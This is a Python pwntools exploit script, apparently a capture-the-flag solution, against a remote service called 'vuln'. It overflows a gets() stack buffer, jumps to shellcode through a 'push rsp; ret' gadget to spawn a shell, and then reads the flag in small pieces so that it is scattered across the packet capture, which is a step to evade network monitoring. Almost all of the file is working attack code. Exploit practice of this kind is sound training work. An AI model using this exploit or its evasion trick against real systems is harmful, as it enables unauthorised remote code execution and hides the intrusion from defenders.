#!/usr/bin/env python3
from pwn import *
import time

# push rsp ; ret  -- present in the statically-linked target binary.
# After main's `ret`, rsp points at the bytes right after the return-address
# slot, i.e. the start of our shellcode. `push rsp ; ret` then jumps there, so
# the exploit works regardless of stack ASLR.
#
# Canonical address in the original build is 0x41feeb; the exact offset of the
# gadget inside statically-linked libc shifts with the glibc version, so we
# locate it in a local copy of the target binary at runtime.
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

TARGET_HOST = 'vuln'
TARGET_PORT = 1337

elf = ELF('./vuln', checksec=False)
push_rsp_ret = next(elf.search(asm('push rsp; ret'), executable=True))
assert b'\n' not in p64(push_rsp_ret), "gadget address contains a newline byte"
log.info("push rsp; ret gadget @ %#x" % push_rsp_ret)

shellcode = asm(shellcraft.sh())
assert b'\n' not in shellcode, "shellcode contains newline; gets() would truncate it"

# char buffer[32]; gets(buffer)  ->  32 buffer + 8 saved rbp = 40 to retaddr.
payload = b"A" * 40 + p64(push_rsp_ret) + shellcode

p = remote(TARGET_HOST, TARGET_PORT)
p.recvuntil(b"name!", timeout=5)     # "WELCOME! Please enter your name!"
p.sendline(payload)                  # trailing newline terminates gets()
time.sleep(0.5)

# Shell obtained -- read the flag one 3-byte chunk at a time so each piece
# travels in its own request and is scattered across the packet capture.
log.success("shell obtained, reading flag in pieces")
flag = b""
i = 1
while True:
    p.sendline(b"cat flag/%d.txt 2>/dev/null; echo END%d" % (i, i))
    try:
        data = p.recvuntil(b"END%d" % i, timeout=3)
    except EOFError:
        break
    piece = data.split(b"END%d" % i)[0].replace(b"\n", b"").strip()
    if not piece:
        break
    log.success("piece %d: %r" % (i, piece))
    flag += piece
    i += 1
    time.sleep(0.4)

log.success("FLAG: %r" % flag)
try:
    p.sendline(b"exit")
    time.sleep(0.3)
    p.close()
except Exception:
    pass
